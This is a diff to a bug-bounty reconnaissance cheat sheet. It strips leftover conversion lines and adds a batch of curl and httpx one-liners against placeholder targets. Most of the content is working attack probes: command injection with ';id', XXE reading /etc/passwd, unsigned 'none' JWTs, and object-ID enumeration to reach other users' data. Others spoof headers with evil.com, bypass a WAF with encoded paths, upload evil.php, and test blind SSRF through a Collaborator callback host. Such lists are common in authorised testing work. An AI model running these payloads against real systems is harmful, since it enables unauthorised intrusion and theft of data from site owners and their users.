@@ -1979,7 +1979,6 @@ Search for Backup Database Dumps (SQL, SQLite)
 ```bash
 cat subdomains.txt | httpx -silent -path-list <(echo -e '/db.sql\n/database.sql\n/dump.sql\n/backup.db') -mc 200 -o db_dumps.txt
 ```
-Here’s the converted content:
 
 Detect Exposed SSL Certificates (pem)
 ```bash
@@ -2091,8 +2090,6 @@ Detect Exposed Open Directory Listings
 cat subdomains.txt | httpx -silent -fr '<title>Index of /' -o open_directories.txt
 ```
 
-Here is the converted content:
-
 Find Open Jenkins Script Console (RCE Point)
 ```bash
 cat subdomains.txt | httpx -silent -path /script -mc 200 -o jenkins_script_console.txt
@@ -2197,7 +2194,6 @@ Look for Exposed Jenkins Build Logs
 ```bash
 cat subdomains.txt | httpx -silent -path /job/test/lastBuild/consoleText -mc 200 -o jenkins_build_logs.txt
 ```
-Here is the converted content:
 
 Find Open Adminer DB Management Tools
 ```bash
@@ -2298,8 +2294,6 @@ Find Exposed Debug Toolbar (Django Debug)
 ```bash
 cat subdomains.txt | httpx -silent -path /__debug__/ -mc 200 -o django_debug_toolbar.txt
 ```
-
-Here is the converted content:
 
 Detect Open Directories with Readable Files
 ```bash
@@ -2411,8 +2405,6 @@ Scan for Default Tomcat Admin Panels
 cat subdomains.txt | httpx -silent -path /manager/html -mc 200 -o tomcat_admin_exposed.txt
 ```
 
-Here is the converted content:
-
 Look for Public Backup Files (tar/zip dumps)
 ```bash
 cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\n/backup.tar.gz\n/db.sql') -mc 200 -o exposed_backups.txt
@@ -2518,8 +2510,6 @@ Detect Command Injection Points
 cat subdomains.txt | gf command-injection | qsreplace ';id' | httpx -silent -fr 'uid=' -o cmd_injection.txt
 ```
 
-Here is the converted content:
-
 Find Exposed Docker Daemon API (Remote Control)
 ```bash
 naabu -list subdomains.txt -p 2375 -silent | httpx -silent -o docker_api_exposed.txt
@@ -2624,7 +2614,6 @@ Find XML External Entity (XXE) Injection Points
 ```bash
 cat subdomains.txt | gf xxe | qsreplace 'file:///etc/passwd' | httpx -silent -fr 'root:x' -o xxe_exploitable.txt
 ```
-Here is the converted content:
 
 Detect Misconfigured AWS Cognito Pools (Token Takeover)
 ```bash
@@ -2731,8 +2720,6 @@ Find Kubernetes Dashboard Exposures
 cat subdomains.txt | httpx -silent -path /api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/ -mc 200 -o k8s_dashboard_exposed.txt
 ```
 
-Here is the converted content:
-
 Exposed Swagger / API Documentation  
 ```bash
 curl -s https://target.com/swagger.json
@@ -2833,7 +2820,6 @@ Sensitive Parameter Brute Force
 ```bash
 cat params.txt | xargs -I{} curl -s "https://target.com/?{}=test"
 ```
-Here’s the conversion for the provided content:
 
 GraphQL Introspection Check  
 ```bash
@@ -2964,7 +2950,6 @@ Check for Debug Endpoints
 ```bash
 curl -s https://target.com/debug/vars
 ```
-Here’s the converted content:
 
 **Server Header Disclosure**  
 ```bash
@@ -3090,8 +3075,6 @@ curl -s https://target.com | grep -E 'AWS_ACCESS_KEY|DB_PASSWORD'
 ```bash
 curl -I https://target.com | grep -i "X-Frame-Options\|Content-Security-Policy\|Strict-Transport-Security"
 ```
-
-Here's the converted content:
 
 **Test for Gopher SSRF**  
 ```bash
@@ -3335,4 +3318,110 @@ curl -s https://target.com/app.js | grep -i "localStorage\|sessionStorage"
 **Check for Blind SSRF via PDF Generation**  
 ```bash
 curl -X POST https://target.com/api/generate-pdf -d '{"url":"http://your-collaborator.burpcollaborator.net"}'
+```
+
+**Test for Misconfigured CSP (Content Security Policy)**  
+```bash
+curl -I https://target.com | grep -i "content-security-policy"
+```
+
+**Detect Unauthenticated Admin Panels**  
+```bash
+curl -I https://target.com/admin/
+```
+
+**Check for Web Cache Deception**  
+```bash
+curl -I https://target.com/logout.jpg
+```
+
+**Look for Backup Files Exposed**  
+```bash
+curl -I https://target.com/config.php.bak
+```
+
+**Scan for Parameter Pollution (HPP)**  
+```bash
+curl "https://target.com/api?user=admin&user=guest"
+```
+
+**Detect JWT Injection**  
+```bash
+curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoibWVAdmUuY29tIn0." https://target.com/api/user
+```
+
+**Check for Broken Object Level Authorization (BOLA)**  
+```bash
+curl "https://target.com/api/v1/orders/1001" -b "session=your-cookie"
+```
+Change 1001 to 1002, 1003 and see if you can access others' data.
+
+**Test for Insecure Redirect via Referer Header**  
+```bash
+curl -H "Referer: https://evil.com" https://target.com
+```
+
+**Identify Leaked API Documentation**  
+```bash
+curl -s https://target.com/api/docs/
+```
+
+**Test for GraphQL Batch Query Abuse**  
+```bash
+curl -X POST https://target.com/graphql -d '{"query":"{user(id:1) {name} user(id:2) {name} user(id:3) {name}}"}'
+```
+
+**Find Misconfigured CORS (Advanced)**  
+```bash
+curl -I -H "Origin: https://evil.com" https://target.com
+```
+
+**Check for WebSockets Injection**  
+```bash
+wscat -c ws://target.com/socket
+```
+
+**Search for Backup Directories in Wayback**  
+```bash
+curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | grep -iE "\.bak|\.old|\.zip"
+```
+
+**Find Laravel .env Exposure**  
+```bash
+curl -s https://target.com/.env
+```
+
+**Detect Exposed Debug Pages (Laravel, Symfony, etc)**  
+```bash
+curl -I https://target.com/_profiler/
+```
+
+**Check for Misconfigured Proxy Headers (IP Spoofing)**  
+```bash
+curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin/
+```
+
+**Look for API Key in Mobile App Files**  
+```bash
+curl -s https://target.com/app.apk | strings | grep -i "apikey\|token"
+```
+
+**Scan for WAF Bypass via Encoding**  
+```bash
+curl --path-as-is "https://target.com/%2e%2e/%2e%2e/admin/"
+```
+
+**Test for Host Header Injection**  
+```bash
+curl -H "Host: evil.com" https://target.com
+```
+
+**Look for S3 Bucket Leaks in JS**  
+```bash
+curl -s https://target.com/app.js | grep -i "s3.amazonaws.com"
+```
+
+**Detect File Upload Vulnerabilities**  
+```bash
+curl -F "file=@evil.php" https://target.com/upload
 ```
